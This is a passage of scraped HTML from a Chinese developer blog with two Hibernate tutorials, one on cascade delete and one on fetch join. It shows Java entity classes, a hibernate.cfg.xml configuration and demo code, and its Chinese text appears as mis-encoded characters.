    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "category_id")</span>
    <span class="hljs-keyword">private</span> Category category;

    <span class="hljs-comment">// Getters å’Œ Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Double <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(Double price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }

    <span class="hljs-keyword">public</span> Category <span class="hljs-title function_">getCategory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> category;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCategory</span><span class="hljs-params">(Category category)</span> {
        <span class="hljs-built_in">this</span>.category = category;
    }
}
</code></pre>
<h4 data-id="heading-4">æ­¥éª¤äºŒï¼šé…ç½®Hibernate</h4>
<p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥é…ç½®Hibernateè¿æ¥å’Œæ˜ å°„ã€‚</p>
<h5 data-id="heading-5">Hibernateé…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Category"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">æ­¥éª¤ä¸‰ï¼šå®ç”¨ç±»HibernateUtil</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-7">æ­¥éª¤å››ï¼šå®ç°çº§è”åˆ é™¤</h4>
<p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªæ–¹æ³•æ¥æ¼”ç¤ºçº§è”åˆ é™¤çš„æ•ˆæœã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> com.example.domain.Category;
<span class="hljs-keyword">import</span> com.example.domain.Product;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateCascadeDeleteExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥ç¤ºä¾‹æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// æµ‹è¯•çº§è”åˆ é™¤</span>
        testCascadeDelete(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Category</span>();
            category.setName(<span class="hljs-string">"Electronics"</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product1.setName(<span class="hljs-string">"Laptop"</span>);
            product1.setPrice(<span class="hljs-number">1000.0</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product2.setName(<span class="hljs-string">"Smartphone"</span>);
            product2.setPrice(<span class="hljs-number">500.0</span>);

            category.addProduct(product1);
            category.addProduct(product2);

            session.save(category);

            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCascadeDelete</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–Category</span>
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> session.get(Category.class, <span class="hljs-number">1L</span>);
            <span class="hljs-keyword">if</span> (category != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// åˆ é™¤Category</span>
                session.delete(category);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Category and associated Products deleted"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">è¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>å®šä¹‰å®ä½“ç±»</strong>ï¼š</p>
<ul>
<li><code>Category</code>ç±»ä¸<code>Product</code>ç±»æ˜¯ä¸€å¯¹å¤šå…³ç³»ï¼Œ<code>Category</code>å¯ä»¥æœ‰å¤šä¸ª<code>Product</code>ã€‚</li>
<li>åœ¨<code>Category</code>ç±»ä¸­ï¼Œ<code>@OneToMany</code>æ³¨è§£ç”¨äºå®šä¹‰ä¸<code>Product</code>çš„å…³è”å…³ç³»ï¼Œå¹¶ä¸”é€šè¿‡<code>cascade = CascadeType.ALL</code>æŒ‡å®šæ‰€æœ‰æ“ä½œï¼ˆåŒ…æ‹¬åˆ é™¤ï¼‰éƒ½è¿›è¡Œçº§è”å¤„ç†ã€‚åŒæ—¶ï¼Œ<code>orphanRemoval = true</code>ç¡®ä¿å­¤å„¿å¯¹è±¡ï¼ˆå³ä¸å†è¢«å¼•ç”¨çš„å­å¯¹è±¡ï¼‰ä¹Ÿä¼šè¢«åˆ é™¤ã€‚</li>
<li><code>Product</code>ç±»ä¸­çš„<code>@ManyToOne</code>æ³¨è§£ç”¨äºå®šä¹‰ä¸<code>Category</code>çš„å¤šå¯¹ä¸€å…³ç³»ã€‚</li>
</ul>
</li>
<li>
<p><strong>é…ç½®æ–‡ä»¶</strong>ï¼š</p>
<ul>
<li><code>hibernate.cfg.xml</code>é…ç½®æ–‡ä»¶ç”¨äºè®¾ç½®æ•°æ®åº“è¿æ¥ã€Hibernateå±æ€§å’Œæ˜ å°„ç±»ã€‚</li>
</ul>
</li>
<li>
<p><strong>å®ç”¨ç±»HibernateUtil</strong>ï¼š</p>
<ul>
<li><code>HibernateUtil</code>ç±»æä¾›äº†è·å–<code>SessionFactory</code>å®ä¾‹çš„æ–¹æ³•ã€‚</li>
</ul>
</li>
<li>
<p><strong>å®ç°çº§è”åˆ é™¤</strong>ï¼š</p>
<ul>
<li>åœ¨<code>insertSampleData</code>æ–¹æ³•ä¸­ï¼Œåˆ›å»ºå¹¶ä¿å­˜ä¸€ä¸ª<code>Category</code>å’Œä¸¤ä¸ªå…³è”çš„<code>Product</code>ã€‚</li>
<li>åœ¨<code>testCascadeDelete</code>æ–¹æ³•ä¸­ï¼Œè·å–ä¸€ä¸ª<code>Category</code>å¯¹è±¡å¹¶å°†å…¶åˆ é™¤ã€‚ç”±äºé…ç½®äº†çº§è”åˆ é™¤ï¼Œç›¸å…³è”çš„<code>Product</code>å¯¹è±¡ä¹Ÿä¼šè¢«è‡ªåŠ¨åˆ é™¤ã€‚</li>
</ul>
</li>
</ol>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥è½»æ¾å®ç°Hibernateä¸­çš„çº§è”åˆ é™¤åŠŸèƒ½ï¼Œä»¥ç¡®ä¿åœ¨åˆ é™¤ä¸»å®ä½“æ—¶è‡ªåŠ¨åˆ é™¤å…³è”çš„å­å®ä½“ï¼Œä»è€Œä¿æŒæ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ44ï¼‰Hibernateä¸­çš„fetch joinæ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7595150851477831723</link>    <guid>https://juejin.cn/post/7595150851477831723</guid>    <pubDate>2026-01-15T11:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595150851477831723" data-draft-id="7595178023256915987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ44ï¼‰Hibernateä¸­çš„fetch joinæ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T11:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ44ï¼‰Hibernateä¸­çš„fetch joinæ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:47:00.000Z" title="Thu Jan 15 2026 11:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨Hibernateä¸­ï¼Œ<code>fetch join</code>æ˜¯ä¸€ç§é€šè¿‡å•ä¸ªæŸ¥è¯¢åŒæ—¶åŠ è½½ç›¸å…³å®ä½“çš„æ–¹æ³•ã€‚è¿™ç§æ–¹å¼å¯é¿å…N+1æŸ¥è¯¢é—®é¢˜ï¼Œæé«˜æ•°æ®è®¿é—®æ•ˆç‡ã€‚<code>fetch join</code>é€šå¸¸ç”¨äºè§£å†³å»¶è¿ŸåŠ è½½å¸¦æ¥çš„æ€§èƒ½é—®é¢˜ã€‚</p>
<h3 data-id="heading-0">Fetch Joinç¤ºä¾‹</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªå®ä½“ç±»ï¼š<code>Category</code>å’Œ<code>Product</code>ï¼Œå®ƒä»¬ä¹‹é—´æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ã€‚æˆ‘ä»¬å°†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨<code>fetch join</code>åœ¨æŸ¥è¯¢<code>Category</code>æ—¶ï¼ŒåŒæ—¶åŠ è½½å…¶å…³è”çš„<code>Product</code>ã€‚</p>
<h4 data-id="heading-1">æ­¥éª¤ä¸€ï¼šå®šä¹‰å®ä½“ç±»</h4>
<h5 data-id="heading-2"><code>Category</code>å®ä½“ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "category")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Category</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@OneToMany(mappedBy = "category", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Product&gt; products = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-comment">// Getters å’Œ Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Set&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProducts</span><span class="hljs-params">(Set&lt;Product&gt; products)</span> {
        <span class="hljs-built_in">this</span>.products = products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product)</span> {
        products.add(product);
        product.setCategory(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeProduct</span><span class="hljs-params">(Product product)</span> {
        products.remove(product);
        product.setCategory(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h5 data-id="heading-3"><code>Product</code>å®ä½“ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "category_id")</span>
    <span class="hljs-keyword">private</span> Category category;

    <span class="hljs-comment">// Getters å’Œ Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Double <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(Double price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }

    <span class="hljs-keyword">public</span> Category <span class="hljs-title function_">getCategory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> category;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCategory</span><span class="hljs-params">(Category category)</span> {
        <span class="hljs-built_in">this</span>.category = category;
    }
}
</code></pre>
<h4 data-id="heading-4">æ­¥éª¤äºŒï¼šé…ç½®Hibernate</h4>
<p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥é…ç½®Hibernateè¿æ¥å’Œæ˜ å°„ã€‚</p>
<h5 data-id="heading-5">Hibernateé…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
